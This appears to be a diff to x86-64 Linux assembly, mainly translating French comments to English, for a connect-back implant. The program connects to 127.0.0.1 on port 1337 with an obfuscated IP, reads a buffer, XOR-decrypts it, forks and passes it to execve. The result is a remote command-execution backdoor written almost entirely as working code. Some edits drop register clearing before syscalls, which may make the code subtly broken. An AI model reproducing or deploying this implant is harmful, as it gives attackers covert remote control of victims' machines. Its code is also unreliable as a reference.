@@ -12,7 +12,7 @@ _socket:
         xor rbx,rbx
         xor rax,rax
         xor rcx,rcx
-        xor rdx,rdx                     ; purge des registres
+        xor rdx,rdx                     ; purge registers
 
         push byte 2                     ; Family - AF_INET (2) pour IPv4
         pop rdi
@@ -21,28 +21,29 @@ _socket:
         xor rdx, rdx
         mov al, 41                      ; syscall socket
         syscall
-        mov r15, rax			; saving socket
+        mov r15, rax			        ; saving socket
 
 ; ----- () sys_connect -----
 _connect:
 	xor rdi, rdi                    
-        xor rsi, rsi
-        xor rdi, rdi
+    xor rsi, rsi
+    xor rdi, rdi
 
-        mov rdi, r15                    ; on récupère le old_fd
+    mov rdi, r15                    ; getting fd
 
-        mov rcx, 0x12111190             ; set IP to 127.0.0.1(0x12111190) + 0x11111111
-        sub rcx, 0x11111111             ; -> - 0x11111111 pour arriver à 127.0.0.1
+    mov rcx, 0x12111190             ; set IP to 127.0.0.1(0x12111190) + 0x11111111
+    sub rcx, 0x11111111             ; -> - 0x11111111 pour arriver à 127.0.0.1
 
-        push rcx
-        push word 0x3905                ; port 1337
-        push word 2
-        mov rsi, rsp                    ; struct sockaddr
-        push byte 36                           
-        pop rdx                         ; addrlen - 36
-        xor rax, rax
-        mov al, 42
-        syscall
+    push rcx
+    push word 0x3905                ; port 1337
+    push word 2
+    mov rsi, rsp                    ; struct sockaddr
+
+    push byte 36
+    pop rdx                         ; addrlen = 36
+
+    mov al, 42
+    syscall
 
 
 ; ----- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
@@ -57,7 +58,7 @@ _read:
 	
 	push sock_buffer
 	mov rsi, rsp			; rsi <- char *buf : 
-					        ; destination (on alloue une la taille de 2048 à la mémoire)
+					        ; destination (on alloue une la taille de 255 à la mémoire)
 		
 	mov rdx, 255			; rdx <- size_t count : on lui donne la taille du buffer
 	syscall
@@ -67,7 +68,7 @@ _read:
 	cmp rax, 0
     jz _exit               ; jump in exit if receved is nothing
 
-_decrypt_xor:              ; xor function
+_decrypt_xor:              ; xor decrypt function
     ; rsi = buffer
     ; rbx = size buffer
     ; rdx (dl) = xor key
@@ -78,11 +79,10 @@ _decrypt_xor:              ; xor function
         dec rbx
         jne next_byte
 
-	mov r12, rsi          ; mov fd dans r12 pour l'utiliser plutard
+	mov r12, rsi          ; mov fd in r12
 
 ; ---- (57) sys_fork ----
 _fork:
-    xor rax, rax
 	mov al, 57			; sys_fork
 	syscall
 
@@ -90,14 +90,13 @@ _fork:
 	je _execve			; jmp child process to execve
 
     cmp rax, -1
-    je _send_error      ; si le fork fail -> goto send_error
+    je _send_error      ; if fork failed -> goto send_error
 
 	jmp _read			; jmp in parent sys_connect if in parent process
 
 
 ; ----- (59) execve (const char *filename, const char *const argv[], const char *const envp[]) -----
 _execve:
-	xor rax, rax
     xor rbx, rbx
     xor rcx, rcx
 	xor rsi, rsi	
